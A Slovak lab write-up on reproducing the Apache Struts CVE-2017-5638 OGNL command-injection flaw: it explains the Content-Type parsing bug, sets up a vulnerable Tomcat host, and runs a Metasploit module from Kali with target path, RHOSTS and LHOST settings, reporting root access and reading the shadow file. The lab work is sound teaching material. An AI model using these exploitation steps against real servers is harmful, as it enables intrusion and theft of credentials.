# Otestovanie zraniteľnosti Struts na Ubuntu 16.04.02

Zraniteľnosť CVE-2017-5638 sa týkala webového aplikačného rámca Struts, ktorý slúži na vytváranie webových
aplikácií v programovacom jazyku Java. Jednalo sa o verzie rámca Struts od 2.3.5 do 2.3.31 a od 2.5
po 2.5.10. Rámec Struts bol zraniteľný voči útoku *remote command injection*, kvôli nesprávnemu spracovaniu
hlavičky  Content-Type v požiadavke HTTP, čo umožňovalo vykonanie príkazov pod oprávneniami webového servera.

Zraniteľnosť vznikla kvôli analyzátoru Jakarta Multipart, ktorý slúži na odosielanie súborov.
Ak hodnota v hlavičke Content-Type nebola platná, čiže nezodpovedala očakávanému platnému typu,
vyhodí sa výnimka, ktorá sa následne použije na zobrazenie chybovej správy používateľovi. V tomto
prípade môžeme nastaviť hlavičku Content-Type na výraz v jazyku OGNL. Takto bolo možné spustiť OGNL príkazy,
ktoré následne spustili systémové volania.

## Konfigurácia Ubuntu

Pre vytvorenie zraniteľného systému sme postupovali podľa návodu
*[Exploiting Apache Struts with CVE-2017-5638](https://samsclass.info/124/proj14/p9xstruts.htm)*. Podľa návodu sme
nainštalovali webový server Apache Tomcat a Maven. Na záver sme na server vložili zraniteľný rámec Struts.

## Konfigurácia Kali Linux

Pre zaútočenie sme vložili súbor `set-msfconsole.rc` a `HACK.sh` na plochu distribúcie Kali. Útok spustíme otvorením konzoly a spustením príkazu:

```shell
./Desktop/HACK.sh
```

`HACK.sh` nám otvorí v konzole nástroj msfconsole pomocou súboru `set-msfconsole.rc`. V ňom sa nastaví IP zraniteľnej mašiny pomocou
`set RHOSTS 192.168.50.30` a cesta `set targeturi /struts2_2.3.15.1-showcase/showcase.action`, čo nám nastaví cestu k
zraniteľnej aplikácii Struts. Ostáva nám nastaviť IP útočníka `set LHOST 192.168.50.31` a spustiť útok. 

Útok prebehne úspešne, dokonca dostaneme privilégiá *root*, čiže môžeme čítať súbor shadow.
